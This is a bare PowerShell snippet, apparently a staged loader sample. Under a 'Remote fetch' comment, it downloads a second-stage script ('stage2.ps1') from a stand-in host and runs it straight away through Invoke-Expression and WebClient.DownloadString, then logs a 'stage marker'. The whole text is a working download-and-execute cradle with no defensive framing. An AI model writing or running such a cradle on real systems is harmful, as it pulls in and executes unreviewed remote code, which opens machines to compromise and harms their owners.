<# Remote fetch #> $FetchUrl = 'http://adatum.com:80/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($FetchUrl); Write-Verbose "stage marker 26 reached"
